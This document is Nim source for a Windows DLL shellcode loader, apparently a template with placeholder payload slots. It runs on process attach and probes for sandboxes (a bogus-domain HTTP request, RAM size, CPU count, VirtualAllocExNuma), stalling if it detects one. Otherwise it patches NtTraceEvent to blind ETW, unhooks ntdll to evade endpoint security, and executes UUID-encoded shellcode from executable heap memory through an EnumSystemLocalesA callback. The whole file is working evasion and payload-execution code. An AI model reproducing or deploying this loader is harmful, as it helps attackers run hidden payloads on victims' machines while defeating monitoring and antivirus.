import winim
import std/strformat
import std/strutils
import ptr_math
import std/dynlib
import std/httpclient
import std/osproc
import std/os

when defined amd64:
    const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc sbCheck(): int =
    var count: int = 0
    let clientHttp = newHttpClient()
    let testUrl: string = "http://0hRIb4t1fWNPYBVA.net/index.php"
    # Attempt to reach nonexistent url
    try:
        let responseHttp = clientHttp.get(testUrl)
        if responseHttp.code == cast[HttpCode]("200") or responseHttp.status == "200":
            count += 1
    except:
        count += 0
    # Get installed RAM size
    var memAvail: ULONGLONG
    GetPhysicallyInstalledSystemMemory(addr memAvail)
    if memAvail < 4000000:
        count += 1 
    # Attempt VirtualAllocExNuma - Should fail in a sandbox
    var mem: LPVOID = NULL
    mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0)
    if mem != NULL: 
        count += 0
    else:
        count += 1
    # Check processor count
    if countProcessors() < 2:
        count += 1

    return count

proc Patchn(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        trace: string
        ntd: string
        disabled: bool = false

    trace.add("Nt")
    trace.add("Trace")
    trace.add("Event")
    
    ntd.add("nt")
    ntd.add("dll")

    ntdll = loadLib(ntd)
    if isNil(ntdll):
        return disabled

    cs = ntdll.symAddr(trace.cstring)
    if isNil(cs):
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var ntd: string
  var ntdPath: string
  ntd.add("nt")
  ntd.add("dl")
  ntd.add("l.ll")

  ntdPath.add("C:\\")
  ntdPath.add("win")
  ntdPath.add("dows\\")
  ntdPath.add("sys")
  ntdPath.add("tem")
  ntdPath.add("32\\")
  ntdPath.add(ntd)
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA(ntd)
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open(ntdPath,fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo fmt"Could not create file mapping object ({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Could not map view of file ({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            echo fmt"Failed calling VPro ({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            echo fmt"Failed resetting memory back to it's orignal protections ({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true

proc NimMain() {.cdecl, importc.}

proc execute(): void =
    const SIZE = REPLACE_ME_SIZE
    var UUIDARR = allocCStringArray(REPLACE_ME_UUID)

    let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    let ha = HeapAlloc(hHeap, 0, 0x100000)
    var hptr = cast[DWORD_PTR](ha)

    #[if hptr != 0:
        echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
    else:
        echo fmt"[-] Heap Alloc Error "
        quit(QuitFailure)
    ]#

    for i in 0..(SIZE-1):
        var status = UuidFromStringA(cast[RPC_CSTR](UUIDARR[i]), cast[ptr UUID](hptr))
        if status != RPC_S_OK:
            if status == RPC_S_INVALID_STRING_UUID:
                echo fmt"[-] Invalid UUID String"
            else:
                echo fmt"[-] Something Went Wrong, Error Code: {status}"
            quit(QuitFailure)
        hptr += 16

    EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0)
    CloseHandle(hHeap)
    quit(QuitSuccess)

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    NimMain()
    #echo "hinstDLL is: ", hinstDLL
    if fdwReason == DLL_PROCESS_ATTACH:
        if sbCheck() >= 3:
            for i in 1 .. 100000:
                sleep(100)
        else:
            discard Patchn()
            discard ntdllunhook()
            execute()
    return true